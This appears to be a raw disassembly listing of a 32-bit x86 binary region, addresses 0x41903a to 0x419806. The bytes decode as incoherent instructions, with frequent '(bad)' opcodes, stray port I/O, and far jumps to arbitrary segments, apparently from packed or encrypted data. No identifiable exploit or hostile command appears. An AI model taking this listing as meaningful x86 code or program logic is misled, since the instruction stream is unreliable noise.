  41903a:	adc    BYTE PTR [eax+0x14],bh
  41903d:	or     eax,0xdc23d887
  419042:	adc    BYTE PTR [eax],al
  419044:	adc    BYTE PTR es:[edx-0x53],cl
  419048:	in     al,0x70
  41904a:	daa    
  41904b:	sub    al,BYTE PTR [edi-0x26]
  41904e:	add    ebp,DWORD PTR ds:0xa4aed280
  419054:	out    dx,eax
  419055:	enter  0xb528,0xf
  419059:	or     al,0x4f
  41905b:	or     al,bh
  41905d:	pop    ds
  41905e:	cmp    eax,DWORD PTR [edi-0x49]
  419061:	jge    0x4190cc
  419063:	lods   al,BYTE PTR ds:[esi]
  419064:	mov    dl,0x54
  419066:	pusha  
  419067:	fild   WORD PTR [ebx]
  419069:	mov    ch,0x92
  41906b:	sbb    eax,0xb7ca7c9f
  419070:	mov    eax,ds:0x94de284e
  419075:	mov    ecx,0x2af231e8
  41907a:	dec    eax
  41907b:	enter  0xb60f,0xfe
  41907f:	ficomp DWORD PTR [ecx-0x68]
  419082:	mov    bl,0xdb
  419084:	or     eax,0xe1c6789b
  419089:	addr16 test eax,0x27ad5a67
  41908f:	jmp    0x419062
  419091:	dec    ecx
  419092:	aad    0xeb
  419094:	loop   0x4190a6
  419096:	gs pusha 
  419098:	jl     0x419085
  41909a:	ret    
  41909b:	in     al,0xf7
  41909d:	dec    esi
  41909e:	mov    ebp,0xb465ca2
  4190a3:	cmp    ch,al
  4190a5:	mov    al,0x84
  4190a7:	ror    BYTE PTR [eax+0x69035e5e],cl
  4190ad:	xor    eax,0x96a6b619
  4190b2:	or     ah,BYTE PTR [edi]
  4190b4:	fistp  QWORD PTR [esi]
  4190b6:	adc    al,0x16
  4190b8:	xchg   ecx,eax
  4190b9:	fsub   QWORD PTR [edi+0x36]
  4190bc:	jb     0x419119
  4190be:	fdivr  st,st(3)
  4190c0:	(bad)  
  4190c1:	fidiv  WORD PTR [eax]
  4190c3:	out    0x31,al
  4190c5:	pushf  
  4190c6:	pop    esp
  4190c7:	(bad)  
  4190c8:	or     al,BYTE PTR [ebp+0x5902d4ab]
  4190ce:	popf   
  4190cf:	jb     0x419110
  4190d1:	popf   
  4190d2:	into   
  4190d3:	adc    eax,0x38550fa5
  4190d8:	daa    
  4190d9:	xchg   ebp,eax
  4190da:	imul   ebx,DWORD PTR [ecx],0xd45486f6
  4190e0:	lahf   
  4190e1:	daa    
  4190e2:	push   esi
  4190e3:	inc    edi
  4190e4:	mov    al,ds:0xb978b5cd
  4190e9:	xchg   esi,eax
  4190ea:	test   ax,0x1e5f
  4190ee:	out    dx,eax
  4190ef:	xchg   DWORD PTR [edi],ebp
  4190f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190f2:	ja     0x419099
  4190f4:	adc    DWORD PTR [ebx-0x5e],ebp
  4190f7:	cli    
  4190f8:	inc    esi
  4190f9:	sahf   
  4190fa:	bound  eax,QWORD PTR [edx-0x54]
  4190fd:	imul   ebp,ebp,0xc75a0c7a
  419103:	xor    bl,al
  419105:	jo     0x4190e4
  419107:	jae    0x4190bb
  419109:	pop    esi
  41910a:	or     edi,DWORD PTR [ebx+0x3b]
  41910d:	sub    eax,0x987b75d4
  419112:	test   BYTE PTR [eax],0x4a
  419115:	mov    DWORD PTR [esi+0x63972b25],eax
  41911b:	mov    bl,al
  41911d:	scas   eax,DWORD PTR es:[edi]
  41911e:	mov    esi,DWORD PTR [ecx]
  419120:	jns    0x41917f
  419122:	pop    ecx
  419123:	mov    ecx,ebx
  419125:	and    ah,BYTE PTR [eax]
  419127:	scas   al,BYTE PTR es:[edi]
  419128:	jb     0x419163
  41912a:	sbb    dh,BYTE PTR [edi]
  41912c:	xor    al,0x66
  41912e:	outs   dx,BYTE PTR ds:[esi]
  41912f:	mov    dh,0x68
  419131:	mov    esi,0x115d4c4c
  419136:	lea    ebx,[edx+0x62]
  419139:	mov    edx,0x4f9a0e50
  41913e:	and    ecx,DWORD PTR [eax]
  419140:	retf   
  419141:	dec    esp
  419142:	popf   
  419143:	sub    al,0x70
  419145:	cs xchg ecx,eax
  419147:	(bad)  
  419148:	aas    
  419149:	repz out 0xb6,al
  41914c:	and    al,0x4d
  41914f:	cdq    
  419150:	ror    BYTE PTR [ecx-0x6800baed],1
  419156:	repz leave 
  419158:	push   ebx
  419159:	xlat   BYTE PTR ds:[ebx]
  41915a:	sar    DWORD PTR cs:[edi+0x41],cl
  41915e:	scas   al,BYTE PTR es:[edi]
  41915f:	(bad)  
  419160:	out    0xf9,al
  419162:	ss (bad) 
  419164:	pusha  
  419165:	aad    0xd8
  419167:	xor    ebp,DWORD PTR [ecx-0x50]
  41916a:	xchg   esi,eax
  41916b:	das    
  41916c:	fisubr WORD PTR [eax+0x2b91a9b]
  419172:	jp     0x4191e3
  419174:	jmp    0x80ad:0x8592b40f
  41917b:	ret    
  41917c:	and    BYTE PTR [eax],0x4a
  41917f:	mov    ebp,0x6e43d75c
  419184:	test   al,0x70
  419186:	aaa    
  419187:	jmp    0x419146
  419189:	(bad)  
  41918b:	addr16 pop edx
  41918d:	sub    eax,0x483ff6ab
  419192:	mov    ebx,0x2030f817
  419197:	push   es
  419198:	(bad)  
  419199:	cmp    BYTE PTR [ebx],ah
  41919b:	or     eax,0xc5ba0bc9
  4191a0:	push   es
  4191a1:	add    ebx,ebx
  4191a3:	xor    DWORD PTR [ecx+eax*4],ebp
  4191a6:	icebp  
  4191a7:	push   cs
  4191a8:	push   eax
  4191a9:	push   ds
  4191aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191ab:	inc    ebx
  4191ac:	pop    edx
  4191ad:	cmp    dh,BYTE PTR [ebx+0x46]
  4191b0:	les    ecx,FWORD PTR [eax-0x2b49f6a6]
  4191b6:	ds dec esi
  4191b8:	imul   ebp,DWORD PTR gs:0xd495218c,0xffffffaa
  4191c0:	xor    DWORD PTR [edx],ebp
  4191c2:	scas   eax,DWORD PTR es:[edi]
  4191c3:	adc    al,0x5f
  4191c5:	mov    ch,BYTE PTR [ebp+0x4d]
  4191c8:	push   es
  4191c9:	add    BYTE PTR [edx-0x56c17784],0xed
  4191d0:	mov    ds:0x714a5317,al
  4191d5:	outs   dx,DWORD PTR ds:[esi]
  4191d6:	push   ebx
  4191d7:	pop    esi
  4191d8:	fimul  WORD PTR [eax+ecx*2]
  4191db:	sahf   
  4191dc:	lea    eax,[esp+ebp*1-0x5f]
  4191e0:	sub    edx,DWORD PTR [edx+ebp*1-0x574a62c5]
  4191e7:	dec    edx
  4191e8:	dec    esp
  4191e9:	cdq    
  4191ea:	into   
  4191eb:	adc    DWORD PTR [ebp+ecx*4+0x20],esi
  4191ef:	push   eax
  4191f0:	or     eax,0x563cb587
  4191f5:	mov    eax,ds:0xbb27af06
  4191fa:	stc    
  4191fb:	inc    esi
  4191fc:	(bad)  
  4191fd:	(bad)  
  4191fe:	push   0x7989e470
  419203:	jnp    0x4191f3
  419205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419206:	mov    eax,0xe452f198
  41920b:	rol    BYTE PTR [edi+0x4af475dd],cl
  419211:	jb     0x419259
  419213:	test   DWORD PTR [ebp+eiz*1+0x25],0x29956b9d
  41921b:	add    eax,0x3c5e7242
  419220:	dec    ebx
  419221:	mov    edx,gs
  419223:	xchg   ebx,eax
  419224:	cmp    al,cl
  419226:	dec    eax
  419227:	test   al,0x16
  419229:	ds dec eax
  41922b:	fdiv   DWORD PTR [ebp+0x4]
  41922e:	and    eax,0x7f3276dd
  419233:	(bad)  
  419234:	xchg   esp,eax
  419235:	mov    esi,0x2550cdb6
  41923a:	mov    BYTE PTR [eax-0x52],al
  41923d:	hlt    
  41923e:	add    DWORD PTR [ecx-0x4b],ecx
  419241:	stos   DWORD PTR es:[edi],eax
  419242:	add    DWORD PTR [edx+eax*1],0xffffff8b
  419246:	dec    edx
  419247:	inc    ebx
  419248:	leave  
  419249:	dec    eax
  41924a:	jo     0x4191ce
  41924c:	out    0x42,eax
  41924e:	sbb    edx,eax
  419250:	xor    DWORD PTR [edx+edx*8+0x2c],esp
  419254:	add    al,0xc4
  419256:	mov    ds:0x6b9dcef6,al
  41925b:	cld    
  41925c:	aaa    
  41925d:	sahf   
  41925e:	sub    edx,edx
  419260:	mov    ds:0x9dcefc49,al
  419265:	cmp    DWORD PTR [edi-0x4269713],0xffffffee
  41926c:	add    esp,DWORD PTR [eax+0x47e3a8b0]
  419272:	mov    dl,0x4a
  419274:	(bad)  
  419275:	jae    0x41923c
  419277:	jno    0x419294
  419279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41927a:	and    ecx,ebx
  41927c:	sbb    BYTE PTR [ebx],dh
  41927e:	les    ebp,FWORD PTR [eax+eax*2+0x3418a4d1]
  419285:	dec    eax
  419286:	xor    eax,0x97289d44
  41928b:	inc    esi
  41928c:	xor    eax,0x2ddbf619
  419291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419292:	int3   
  419293:	sub    dh,dl
  419295:	adc    DWORD PTR [esi+edi*1],edx
  419298:	clc    
  419299:	dec    edx
  41929a:	push   eax
  41929b:	repz push esi
  41929d:	jl     0x419260
  41929f:	jmp    0x419223
  4192a1:	sbb    ebx,edx
  4192a3:	or     eax,0xf4f1f50d
  4192a8:	pop    edi
  4192a9:	adc    DWORD PTR [esi+0x48],esp
  4192ac:	fdivr  QWORD PTR [edx-0x36]
  4192af:	mov    esp,0xd6341f1d
  4192b4:	sbb    DWORD PTR [esi+0x5d7763dc],edx
  4192ba:	test   al,0xa7
  4192bc:	test   eax,0xf2507408
  4192c1:	lea    eax,[ebx]
  4192c3:	jae    0x4192ef
  4192c5:	inc    ebp
  4192c6:	outs   dx,DWORD PTR ds:[esi]
  4192c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192c9:	imul   eax,DWORD PTR [ebx-0x15b4eea1],0xffffffdb
  4192d0:	out    0xa6,eax
  4192d2:	push   esi
  4192d3:	dec    edx
  4192d4:	mov    ah,0xf5
  4192d6:	dec    ebx
  4192d7:	bound  ebp,QWORD PTR [ebp+0x5b62e177]
  4192dd:	push   edx
  4192de:	jno    0x4192fd
  4192e0:	repz dec edi
  4192e2:	cmp    DWORD PTR [ebx-0x2f],edx
  4192e5:	and    edx,esi
  4192e7:	popf   
  4192e8:	adc    BYTE PTR [edi],ah
  4192ea:	sahf   
  4192eb:	adc    ebp,DWORD PTR [esi]
  4192ed:	mov    ds:0x34e3a2bf,eax
  4192f2:	dec    esp
  4192f3:	pop    ds
  4192f4:	jnp    0x4192b6
  4192f6:	mov    ch,0x1f
  4192f8:	jle    0x41935f
  4192fa:	xchg   BYTE PTR [edi],al
  4192fc:	add    al,0x23
  4192fe:	repz jbe 0x419323
  419301:	loopne 0x41937c
  419303:	xor    dl,cl
  419305:	shl    BYTE PTR [ebp+0x283ce7fd],cl
  41930b:	ds cmp ch,bh
  41930e:	nop
  41930f:	loop   0x41930b
  419311:	fild   QWORD PTR [edi]
  419313:	xchg   edi,eax
  419314:	add    al,0xc4
  419316:	std    
  419317:	cmp    BYTE PTR [esp+eiz*4+0x28],dh
  41931b:	sbb    esp,DWORD PTR [ebp+0x55b80c78]
  419321:	lock inc edi
  419323:	mov    WORD PTR [edx],?
  419325:	jecxz  0x419392
  419327:	push   eax
  419328:	push   eax
  419329:	jmp    0xee2d:0x89675643
  419330:	sub    BYTE PTR [eax],cl
  419332:	or     eax,0x9f388cea
  419337:	push   es
  419338:	stc    
  419339:	or     eax,DWORD PTR [eax+0x1f]
  41933c:	jge    0x419317
  41933e:	clc    
  41933f:	in     eax,dx
  419340:	add    DWORD PTR [edi+ebp*1+0x16],edi
  419344:	call   0x2174:0x669cc8ec
  41934b:	aaa    
  41934c:	shr    DWORD PTR [ebx-0x10cc974e],0xfc
  419353:	ret    0xc845
  419356:	je     0x419309
  419358:	mov    DWORD PTR [esi-0x3a],esp
  41935b:	adc    dh,al
  41935d:	pop    ds
  41935e:	push   ds
  41935f:	je     0x4193ca
  419361:	add    BYTE PTR [edx],cl
  419363:	(bad)  
  419364:	cli    
  419365:	clc    
  419366:	lahf   
  419367:	outs   dx,DWORD PTR ds:[esi]
  419368:	shl    BYTE PTR [ebx-0x21ae80cf],1
  41936e:	imul   ecx,DWORD PTR [edx+0x652cf8a5],0x62
  419375:	cmp    BYTE PTR [edi],cl
  419377:	not    DWORD PTR ds:0x333a5953
  41937d:	xor    DWORD PTR [esi+0x3ddf4ffc],edx
  419383:	fwait
  419384:	pushf  
  419385:	push   edi
  419386:	add    ah,BYTE PTR [esi+0x29625a42]
  41938c:	inc    esi
  41938d:	xor    DWORD PTR [esi-0x4b],ecx
  419390:	cmp    edi,edi
  419392:	pushf  
  419393:	jl     0x4193bc
  419395:	(bad)  
  419396:	fnstenv [edi+edx*8-0x540ec292]
  41939d:	icebp  
  41939e:	js     0x4193c6
  4193a0:	loope  0x41937c
  4193a2:	push   esi
  4193a3:	or     al,0xd8
  4193a5:	push   edx
  4193a6:	lahf   
  4193a7:	xchg   edx,eax
  4193a8:	sbb    al,BYTE PTR [edi-0x7ddb7591]
  4193ae:	rol    BYTE PTR [ebp+0x128c736],0xe3
  4193b5:	loopne 0x41937d
  4193b7:	adc    cl,BYTE PTR [eax-0x174b8006]
  4193bd:	mov    al,ds:0x7be06b8c
  4193c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193c3:	push   ecx
  4193c4:	gs fsub st(5),st
  4193c7:	out    dx,eax
  4193c8:	rcl    BYTE PTR [ebx-0x52],cl
  4193cb:	dec    esi
  4193cc:	or     edi,DWORD PTR [eax]
  4193ce:	inc    esi
  4193cf:	ret    
  4193d0:	jmp    0xf1dc7ecc
  4193d5:	imul   esi,DWORD PTR [ebx],0x5b9b3f67
  4193db:	out    0xdd,al
  4193dd:	ret    0xb2fc
  4193e0:	in     al,dx
  4193e1:	jns    0x41941c
  4193e3:	icebp  
  4193e4:	outs   dx,DWORD PTR ds:[esi]
  4193e5:	rcl    DWORD PTR [esi],cl
  4193e7:	xchg   ecx,eax
  4193e8:	shl    DWORD PTR [edi+0x481abb2],1
  4193ee:	mov    dl,0x42
  4193f0:	popa   
  4193f1:	repnz sub al,BYTE PTR [ecx+0x5d7ce508]
  4193f8:	aas    
  4193f9:	fstp   TBYTE PTR ds:0xa4a72a91
  4193ff:	mov    dl,BYTE PTR [ebx]
  419401:	jae    0x419456
  419403:	(bad)  
  419405:	ins    DWORD PTR es:[edi],dx
  419406:	inc    eax
  419407:	dec    esp
  419408:	mov    DWORD PTR [ebp-0x57],esp
  41940b:	xlat   BYTE PTR ds:[ebx]
  41940c:	xchg   esi,eax
  41940d:	retf   
  41940e:	mov    ds:0x37858dab,al
  419413:	jge    0x4193b6
  419415:	push   eax
  419416:	and    BYTE PTR [ebp-0x5ec09922],dh
  41941c:	cmp    al,0xc0
  41941e:	sub    DWORD PTR [ebp-0xc0e0366],esp
  419424:	jbe    0x419436
  419426:	int    0xb0
  419428:	push   edx
  419429:	ja     0x419482
  41942b:	adc    bh,BYTE PTR [esi-0x4b]
  41942e:	mov    ds,WORD PTR [edx]
  419430:	dec    esi
  419431:	inc    eax
  419432:	push   ebp
  419433:	cs mov esp,0xbd67947e
  419439:	jecxz  0x419466
  41943b:	mov    ds:0x770670e2,al
  419440:	jge    0x419409
  419442:	push   0xfffffff2
  419444:	cs jnp 0x419467
  419447:	in     eax,dx
  419448:	mov    eax,ds:0x2a92763f
  41944d:	cdq    
  41944e:	lea    esp,[edi-0x6f5a70cb]
  419454:	xchg   ebx,eax
  419455:	fwait
  419456:	test   BYTE PTR [edi-0x756576f5],cl
  41945c:	sub    BYTE PTR [eax+0x63b7c74c],bh
  419462:	jns    0x4193ed
  419464:	cmc    
  419465:	in     al,dx
  419466:	cmp    dl,BYTE PTR [ecx]
  419468:	das    
  419469:	les    edx,FWORD PTR [edx-0x70e0e4f3]
  41946f:	pop    ebx
  419470:	mov    dh,0xaf
  419472:	bnd jno 0x419427
  419475:	leave  
  419476:	call   0xa1924fb6
  41947b:	jns    0x41941c
  41947d:	mov    ?,WORD PTR [ebx]
  41947f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419480:	(bad)  
  419481:	or     bl,BYTE PTR [edi]
  419483:	pop    esp
  419484:	push   cs
  419485:	rol    DWORD PTR [esi],0x53
  419488:	pop    eax
  419489:	sub    DWORD PTR [esi-0x47],0xffffff9f
  41948d:	pop    edx
  41948e:	or     dh,BYTE PTR [esi]
  419490:	(bad)  
  419491:	cwde   
  419492:	mov    ch,0x2
  419494:	(bad)  
  419495:	jmp    0xbee95faf
  41949a:	ret    0x2221
  41949d:	enter  0xe524,0xc9
  4194a1:	dec    esp
  4194a2:	mov    fs,WORD PTR [esi]
  4194a4:	je     0x419519
  4194a6:	retf   0x515c
  4194a9:	in     eax,0x18
  4194ab:	push   edx
  4194ac:	sti    
  4194ad:	(bad)  [esi]
  4194af:	bound  ebp,QWORD PTR [esi]
  4194b1:	clc    
  4194b2:	push   es
  4194b3:	mov    bl,0x6
  4194b5:	adc    DWORD PTR [ebp+0x6d],0x7e01f245
  4194bc:	sbb    edi,DWORD PTR [ebx]
  4194be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194bf:	call   0x6390a5c4
  4194c4:	mov    dl,0x55
  4194c6:	pop    es
  4194c7:	dec    ecx
  4194c8:	popa   
  4194c9:	outs   dx,BYTE PTR ds:[esi]
  4194ca:	mov    al,ds:0x88a55471
  4194cf:	sbb    DWORD PTR [edi-0x5b2bee70],0xb48ba333
  4194d9:	or     al,0xcc
  4194db:	adc    BYTE PTR [ebp-0x634ce442],dh
  4194e1:	mov    edx,DWORD PTR [edx]
  4194e3:	dec    ch
  4194e5:	jecxz  0x41950e
  4194e7:	xor    esp,DWORD PTR [edx]
  4194e9:	dec    esi
  4194ea:	arpl   WORD PTR [ebx],cx
  4194ec:	jle    0x4194bf
  4194ee:	or     BYTE PTR [edi+0x70],0xcc
  4194f2:	add    edi,ecx
  4194f4:	dec    ebp
  4194f5:	push   ebx
  4194f6:	ss jecxz 0x4194eb
  4194f9:	out    0x84,eax
  4194fb:	popf   
  4194fc:	xor    DWORD PTR [ecx*8-0x12e0a45e],ebp
  419503:	(bad)  
  419504:	repz jecxz 0x4194ec
  419507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419508:	sub    DWORD PTR [edi],eax
  41950a:	outs   dx,DWORD PTR ds:[esi]
  41950b:	mov    edx,0xda81d178
  419510:	iret   
  419511:	xchg   edx,eax
  419512:	add    esp,DWORD PTR [ebx]
  419514:	xchg   esi,eax
  419515:	dec    ecx
  419516:	loop   0x4194d1
  419518:	jns    0x4194bb
  41951a:	jae    0x419519
  41951c:	and    DWORD PTR [edi+0x33b08020],eax
  419522:	or     ebp,DWORD PTR [esi-0x47e7a9ad]
  419528:	pushf  
  419529:	inc    edx
  41952a:	fldcw  WORD PTR [eax]
  41952c:	(bad)  
  41952d:	sbb    BYTE PTR [edx+0x7ceac8ab],dh
  419533:	jnp    0x41957d
  419535:	stc    
  419536:	call   0xf1b:0xe7b4fb90
  41953d:	dec    ecx
  41953e:	shl    DWORD PTR [ebp+0x6d],cl
  419541:	pop    ebp
  419542:	popa   
  419543:	fwait
  419544:	push   ebx
  419545:	sub    BYTE PTR [ebx-0x517d2d00],ah
  41954b:	and    DWORD PTR [edx-0x613ac5c1],0x9efc0896
  419555:	jae    0x4194f2
  419557:	mov    dh,0x2f
  419559:	xchg   DWORD PTR [edx+0x460775fa],ecx
  41955f:	fxch   st(6)
  419561:	call   0xf5ae86eb
  419566:	cmp    eax,0x68463da3
  41956b:	adc    al,0x66
  41956d:	stc    
  41956e:	jecxz  0x4195df
  419570:	fimul  DWORD PTR gs:[ecx+0x3d9d3da0]
  419577:	sub    bh,ch
  419579:	ds push edi
  41957b:	les    esp,FWORD PTR [ebx+0x48]
  41957e:	dec    edi
  41957f:	dec    ebp
  419580:	cdq    
  419581:	mov    ch,0x62
  419583:	and    BYTE PTR [edx],0x79
  419586:	pusha  
  419587:	mov    ds:0x62aba749,eax
  41958c:	and    DWORD PTR [edx-0x54],edi
  41958f:	mov    al,0x93
  419591:	push   edx
  419592:	cmp    eax,0x6945f772
  419597:	xor    DWORD PTR [edx],esp
  419599:	scas   al,BYTE PTR es:[edi]
  41959a:	mov    esp,0x8ee9db1e
  41959f:	scas   eax,DWORD PTR es:[edi]
  4195a0:	pop    eax
  4195a1:	pushf  
  4195a2:	and    ch,BYTE PTR [esi-0x7f]
  4195a5:	jp     0x4195bb
  4195a7:	adc    dh,BYTE PTR [eax+ebp*1+0x766e50cf]
  4195ae:	xchg   ebp,eax
  4195af:	pop    esp
  4195b0:	aad    0xfa
  4195b2:	inc    edi
  4195b3:	aaa    
  4195b4:	cdq    
  4195b5:	int    0x7b
  4195b7:	add    edx,esp
  4195b9:	mov    al,0x79
  4195bb:	mov    dh,BYTE PTR [esp+edi*1]
  4195be:	sar    bl,cl
  4195c0:	leave  
  4195c1:	or     edi,esi
  4195c3:	aaa    
  4195c4:	pop    es
  4195c5:	jp     0x41961d
  4195c7:	scas   al,BYTE PTR es:[edi]
  4195c8:	test   ebp,eax
  4195ca:	mov    ecx,DWORD PTR ds:0xf08fe5a0
  4195d0:	xchg   ebp,eax
  4195d1:	ins    DWORD PTR es:[edi],dx
  4195d2:	sub    DWORD PTR [ecx-0x5847dcd9],edx
  4195d8:	fstp   DWORD PTR [ebx]
  4195da:	hlt    
  4195db:	inc    edx
  4195dc:	dec    ebp
  4195dd:	sbb    DWORD PTR [edi-0x43],ebp
  4195e0:	add    eax,0x6ac2e92f
  4195e5:	add    BYTE PTR [esp+edx*8],dl
  4195e8:	fist   WORD PTR [eax+0x6c7e9ed7]
  4195ee:	ins    BYTE PTR es:[edi],dx
  4195ef:	das    
  4195f0:	inc    esi
  4195f1:	mov    esi,edi
  4195f3:	out    dx,al
  4195f4:	and    al,0x4f
  4195f6:	es or  eax,0x2613cbf1
  4195fc:	adc    eax,0x1b81403
  419601:	ins    BYTE PTR es:[edi],dx
  419602:	(bad)  
  419603:	pusha  
  419604:	push   ecx
  419605:	mov    ebp,0xad66147c
  41960a:	scas   eax,DWORD PTR es:[edi]
  41960b:	sbb    bh,ah
  41960d:	jae    0x4195c4
  41960f:	push   esi
  419610:	and    ch,ch
  419612:	sbb    dl,dl
  419614:	out    0x4a,al
  419616:	mov    si,WORD PTR [ecx+ebx*2+0x79324d26]
  41961e:	scas   eax,DWORD PTR es:[edi]
  41961f:	fdiv   QWORD PTR [ebx+0x7a]
  419622:	cmp    al,0x42
  419624:	out    0x39,al
  419626:	adc    BYTE PTR [edx+edx*8],bl
  419629:	les    esi,FWORD PTR [edi-0x5cb99065]
  41962f:	(bad)  
  419630:	not    DWORD PTR [ebx-0x22]
  419633:	jne    0x41966c
  419635:	gs sub eax,0xb7be00e0
  41963b:	mov    DWORD PTR [ecx+0x4b],ebx
  41963e:	out    dx,eax
  41963f:	out    0xe1,al
  419641:	int    0xa0
  419643:	sub    al,0xd1
  419645:	in     eax,0x3d
  419647:	add    BYTE PTR [ebp-0x2764e6e],dh
  41964d:	mov    bl,0x42
  41964f:	add    al,0xf8
  419651:	mov    al,ds:0x81f58118
  419656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419657:	inc    esp
  419658:	fimul  WORD PTR [esi-0x4c]
  41965b:	stos   DWORD PTR es:[edi],eax
  41965c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41965d:	and    eax,0x5e1a5cae
  419662:	add    esi,ecx
  419664:	test   BYTE PTR [edi+0xde654e8],ch
  41966a:	cs enter 0x2a10,0xf0
  41966f:	xchg   edi,eax
  419670:	dec    edx
  419671:	inc    ecx
  419672:	or     eax,0x8f195a2e
  419677:	mul    ah
  419679:	adc    edx,DWORD PTR [ebx+0x7a0de913]
  41967f:	push   0x6b0f29e5
  419684:	add    dl,BYTE PTR [esi-0x16f4c58e]
  41968a:	jmp    DWORD PTR [eax-0xc]
  41968d:	push   ss
  41968e:	call   0xffb30819
  419693:	sti    
  419694:	xor    BYTE PTR [ecx-0x6383498],dh
  41969a:	call   0xec50:0x923033cc
  4196a1:	jnp    0x419636
  4196a3:	and    cl,BYTE PTR [edi-0x6c]
  4196a6:	std    
  4196a7:	pusha  
  4196a8:	adc    BYTE PTR [esi],dh
  4196aa:	cmp    al,BYTE PTR [eax-0x5d]
  4196ad:	cmc    
  4196ae:	xchg   esp,eax
  4196af:	shl    DWORD PTR [esi],1
  4196b1:	mov    edx,0x7f3f00bd
  4196b6:	jb     0x419690
  4196b8:	aam    0x92
  4196ba:	div    BYTE PTR [ebx*2-0x1d60fb7d]
  4196c1:	dec    ebx
  4196c2:	in     eax,0x8d
  4196c4:	add    DWORD PTR ds:0x727ab118,0xffffffa3
  4196cb:	dec    BYTE PTR [ebx+0x2a]
  4196ce:	imul   esi,DWORD PTR [ebp+0x66],0x33
  4196d2:	pop    ds
  4196d3:	aam    0x68
  4196d5:	or     ch,0x1d
  4196d8:	dec    ebp
  4196d9:	outs   dx,BYTE PTR ds:[esi]
  4196da:	lea    ecx,[eiz*2-0x7382f6ac]
  4196e1:	pop    esi
  4196e2:	pop    ebp
  4196e3:	scas   al,BYTE PTR es:[edi]
  4196e4:	shl    bh,cl
  4196e6:	xchg   ebx,eax
  4196e7:	mov    ebx,0x9282b8b7
  4196ec:	inc    esp
  4196ed:	inc    ecx
  4196ee:	push   ecx
  4196ef:	and    al,0x79
  4196f1:	in     eax,dx
  4196f2:	arpl   WORD PTR [edx],bp
  4196f4:	aad    0x95
  4196f6:	mov    dh,0x51
  4196f8:	push   0x42
  4196fa:	(bad)  
  4196fc:	shl    BYTE PTR [edi],1
  4196fe:	push   esi
  4196ff:	je     0x419777
  419701:	push   esp
  419702:	push   0x45
  419704:	in     eax,dx
  419705:	in     eax,dx
  419706:	(bad)  
  419707:	imul   ebp,DWORD PTR ds:0x554212cd,0x70
  41970e:	xchg   edx,eax
  41970f:	add    BYTE PTR [eax],bl
  419711:	cmp    ebx,esi
  419713:	sbb    al,0xc4
  419715:	push   ss
  419716:	jmp    0xe878:0x36fa0f8c
  41971d:	stos   BYTE PTR es:[edi],al
  41971e:	pusha  
  41971f:	lods   al,BYTE PTR ds:[esi]
  419720:	sbb    al,0x35
  419722:	adc    BYTE PTR [ecx],ah
  419724:	and    al,0xf5
  419726:	or     al,dl
  419728:	popa   
  419729:	cmp    eax,0xee902a9
  41972e:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  419730:	test   DWORD PTR [ebx+edx*1+0x569aaea7],ebx
  419737:	icebp  
  419738:	fidiv  WORD PTR [edx+0x1d]
  41973b:	pop    es
  41973c:	inc    ebp
  41973d:	pop    ebx
  41973e:	push   edi
  41973f:	aas    
  419740:	in     eax,0xd6
  419742:	mov    ch,0x7c
  419744:	jo     0x4197c2
  419746:	mov    eax,ds:0xfec9168b
  41974b:	pop    edi
  41974c:	pop    ebx
  41974d:	sub    DWORD PTR [eax+edx*4+0x786fc36],0xffffffa2
  419755:	(bad)  
  419756:	out    dx,eax
  419757:	jb     0x419760
  419759:	hlt    
  41975a:	or     BYTE PTR ds:0x8d24e5f8,cl
  419760:	mov    ecx,0x1644dd4
  419766:	cli    
  419767:	inc    ecx
  419768:	sbb    eax,0xc7abd98c
  41976d:	call   0xe4b9:0xfb465c34
  419774:	sub    DWORD PTR [ebp+0x1d731c76],ecx
  41977a:	fcom   st(1)
  41977c:	scas   al,BYTE PTR es:[edi]
  41977d:	(bad)  
  41977e:	out    dx,eax
  41977f:	push   ebx
  419780:	push   ds
  419781:	sub    al,0xdc
  419783:	(bad)  [ecx+0x12adc09b]
  419789:	rcl    esi,cl
  41978b:	xor    eax,0xf1a53903
  419790:	clc    
  419791:	js     0x41973e
  419793:	xor    DWORD PTR [ecx-0x50754d96],edx
  419799:	outs   dx,BYTE PTR ds:[esi]
  41979a:	jns    0x419817
  41979c:	inc    cl
  41979e:	or     BYTE PTR [ebp+0x13],bh
  4197a1:	das    
  4197a2:	push   es
  4197a3:	pop    edx
  4197a4:	adc    BYTE PTR [eax],al
  4197a6:	aam    0xd9
  4197a8:	test   eax,0xf7deffd9
  4197ad:	push   ebp
  4197ae:	inc    esp
  4197af:	les    esp,FWORD PTR ds:0x964db0da
  4197b5:	rol    cl,cl
  4197b7:	aas    
  4197b8:	iret   
  4197b9:	xor    cl,dh
  4197bb:	jmp    0xc1c9:0x1e6e4471
  4197c2:	lahf   
  4197c3:	sub    al,0xd
  4197c5:	ret    
  4197c6:	sub    DWORD PTR [ebp-0x2ca8bb5e],edi
  4197cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197cd:	add    eax,0x63188aab
  4197d2:	sbb    al,0x93
  4197d4:	arpl   WORD PTR [edi+0x3c300e22],bx
  4197da:	(bad)  
  4197db:	fidivr WORD PTR [edi]
  4197dd:	inc    ebp
  4197de:	jmp    0x9666:0xa03bcbc0
  4197e5:	cld    
  4197e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197e7:	sar    DWORD PTR [edi+0x690209a5],1
  4197ed:	inc    ebp
  4197ee:	sub    ebx,DWORD PTR [ecx-0x4da5164b]
  4197f4:	push   0xbc3c3f14
  4197f9:	pop    esi
  4197fa:	test   al,0x5
  4197fc:	xchg   ebx,eax
  4197fd:	mov    ?,WORD PTR [edx]
  4197ff:	or     dl,bl
  419801:	loope  0x4197dd
  419803:	daa    
  419804:	outs   dx,BYTE PTR ds:[esi]
  419805:	dec    edi
  419806:	mov    ebp,0xf72e50a
